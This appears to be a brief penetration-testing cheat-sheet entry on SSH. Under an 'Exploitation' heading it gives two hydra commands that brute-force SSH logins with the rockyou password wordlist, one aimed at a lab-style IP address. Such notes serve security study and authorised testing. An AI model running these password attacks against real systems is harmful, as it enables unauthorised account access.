---
description: Nice replacement for telnet
---

# SSH (Secure Socket Shell)

### Exploitation&#x20;

#### Password cracking with hydra

```bash
hydra -t 16 -l <USERNAME> -P /usr/share/wordlists/rockyou.txt -vV <IP-ADDRESS> ssh
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt ssh://10.10.37.123:22
```
